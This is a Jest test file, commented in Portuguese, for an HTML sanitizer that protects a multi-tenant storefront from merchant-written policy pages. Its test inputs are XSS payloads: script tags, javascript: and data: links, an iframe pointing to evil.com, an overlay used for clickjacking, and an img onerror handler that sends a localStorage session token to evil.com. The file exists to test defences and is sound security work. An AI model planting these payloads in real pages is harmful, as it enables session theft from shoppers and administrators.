import { sanitizeStoreHtml } from './sanitize-store-html';

/**
 * As políticas são escritas pelo lojista e renderizadas com
 * dangerouslySetInnerHTML na vitrine. Todas as lojas dividem a origem
 * app.com/loja/{slug}, então script aqui rouba sessão de cliente das outras
 * lojas — e do admin que abrir a página.
 */
describe('sanitizeStoreHtml', () => {
  it('remove <script>', () => {
    const out = sanitizeStoreHtml('<script>alert(1)</script>Termos de uso');
    expect(out).toBe('Termos de uso');
    expect(out).not.toContain('script');
  });

  it('remove handler inline que exfiltra o token do localStorage', () => {
    const payload =
      '<img src=x onerror="fetch(\'//evil.com?t=\'+localStorage.lv_token)">';
    const out = sanitizeStoreHtml(payload);
    expect(out).toBeNull();
  });

  it('remove on* de tags permitidas', () => {
    const out = sanitizeStoreHtml('<p onclick="steal()">texto</p>');
    expect(out).toBe('<p>texto</p>');
    expect(out).not.toContain('onclick');
  });

  it('bloqueia href javascript:', () => {
    const out = sanitizeStoreHtml('<a href="javascript:alert(1)">clique</a>');
    expect(out).not.toContain('javascript:');
  });

  it('bloqueia href data:', () => {
    const out = sanitizeStoreHtml(
      '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>',
    );
    expect(out).not.toContain('data:');
  });

  it('remove iframe', () => {
    expect(sanitizeStoreHtml('<iframe src="//evil.com"></iframe>')).toBeNull();
  });

  it('remove style (clickjacking por overlay)', () => {
    const out = sanitizeStoreHtml(
      '<div style="position:fixed;inset:0;z-index:9999">x</div>',
    );
    expect(out).toBe('<div>x</div>');
  });

  it('remove svg com script embutido', () => {
    const out = sanitizeStoreHtml('<svg><script>alert(1)</script></svg>');
    expect(out).toBeNull();
  });

  it('preserva a formatação que o lojista realmente usa', () => {
    const input =
      '<h2>Trocas</h2><p><strong>Prazo:</strong> 30 dias.</p><ul><li>Item sem uso</li></ul>';
    const out = sanitizeStoreHtml(input);
    expect(out).toContain('<h2>Trocas</h2>');
    expect(out).toContain('<strong>Prazo:</strong>');
    expect(out).toContain('<li>Item sem uso</li>');
  });

  it('mantém link externo e adiciona rel de segurança', () => {
    const out = sanitizeStoreHtml(
      '<a href="https://correios.com.br">rastrear</a>',
    );
    expect(out).toContain('href="https://correios.com.br"');
    expect(out).toContain('noopener');
  });

  it('trata vazio e null', () => {
    expect(sanitizeStoreHtml(null)).toBeNull();
    expect(sanitizeStoreHtml('')).toBeNull();
    expect(sanitizeStoreHtml('   ')).toBeNull();
    expect(sanitizeStoreHtml('<script></script>')).toBeNull();
  });
});
